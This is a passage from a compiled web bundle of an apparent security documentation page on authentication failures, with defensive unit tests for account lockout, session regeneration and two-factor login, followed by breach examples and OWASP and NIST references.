'127.0.0.1')).rejects.toThrow('locked');\n  });\n\n  it('should regenerate session on login', async () => {\n    const oldSessionId = session.id;\n\n    await authController.login(credentials);\n\n    expect(session.id).not.toBe(oldSessionId);\n  });\n\n  it('should require 2FA when enabled', async () => {\n    await userRepository.update(userId, { twoFactorEnabled: true });\n\n    const result = await authController.login(credentials);\n\n    expect(result.requiresTwoFactor).toBe(true);\n    expect(result.accessToken).toBeUndefined();\n  });\n});\n"})}),"\n",(0,i.jsx)(n.h2,{id:"real-world-impact-examples",children:"Real-World Impact Examples"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Dropbox (2012)"}),": Weak password policy led to 68M account breach"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Yahoo (2013-2014)"}),": 3 billion accounts compromised due to weak authentication"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"British Airways (2018)"}),": Session hijacking via Magecart attack"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Twitter (2020)"}),": Account takeover via social engineering and weak MFA"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"references",children:"References"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",children:"OWASP Top 10 2021 - A07"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",children:"OWASP Authentication Cheat Sheet"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",children:"OWASP Session Management Cheat Sheet"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://pages.nist.gov/800-63-3/",children:"NIST Digital Identity Guidelines"})}),"\n"]})]})}function u(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}}}]);